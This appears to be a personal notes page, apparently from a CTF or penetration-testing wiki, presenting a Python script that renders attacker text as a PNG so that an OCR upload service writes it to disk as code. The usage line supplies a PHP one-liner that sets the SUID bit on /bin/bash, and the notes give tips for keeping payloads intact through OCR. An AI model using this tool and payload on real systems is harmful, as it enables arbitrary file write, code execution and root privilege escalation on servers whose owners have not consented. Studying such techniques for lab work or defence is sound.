# OCR RCE Payload Image Generator

Generates a PNG with a monospace-rendered string, for services that OCR an
uploaded image and then write the extracted text to disk (with an
attacker-chosen filename/extension). If the OCR text isn't sanitized before
being saved to a web-servable path, this turns image upload into arbitrary
file write. First used on [[MakeSense]] to write a PHP payload to a
root-owned local OCR app's `saved/` directory.

Monospace fonts keep OCR accuracy high enough to reproduce code
byte-for-byte — proportional fonts are much more likely to introduce
misreads (`l`/`1`/`I`, ligatures, kerning-related spacing errors).

## Usage
```
python3 ocr_payload_image.py "<?php system('chmod +s /bin/bash'); ?>" -o pwn.png
```

## Script
```python
#!/usr/bin/env python3
import argparse
from PIL import Image, ImageDraw, ImageFont

FONT_CANDIDATES = [
    "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf",
    "/usr/share/fonts/truetype/liberation/LiberationMono-Regular.ttf",
]


def build_image(text: str, font_size: int) -> Image.Image:
    font = None
    for path in FONT_CANDIDATES:
        try:
            font = ImageFont.truetype(path, font_size)
            break
        except OSError:
            continue
    if font is None:
        raise SystemExit("No suitable monospace font found")

    tmp = Image.new("RGB", (10, 10), "white")
    box = ImageDraw.Draw(tmp).textbbox((0, 0), text, font=font)

    width = box[2] - box[0] + 80
    height = box[3] - box[1] + 80

    img = Image.new("RGB", (width, height), "white")
    ImageDraw.Draw(img).text((40 - box[0], 40 - box[1]), text, fill="black", font=font)
    return img


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("text", help="Payload text to render (e.g. a PHP one-liner)")
    parser.add_argument("-o", "--output", default="payload.png")
    parser.add_argument("--font-size", type=int, default=64)
    args = parser.parse_args()

    build_image(args.text, args.font_size).save(args.output)
    print(f"Saved {args.output}")
```

## Notes
- Keep the payload short and free of characters the target font renders
  ambiguously (e.g. avoid relying on OCR to distinguish `0`/`O` or `1`/`l`
  if the payload's correctness depends on it).
- If the OCR engine trims whitespace or normalizes quotes, test the exact
  round-trip (image → OCR text → saved file) before assuming payload
  fidelity — don't just eyeball the rendered PNG.
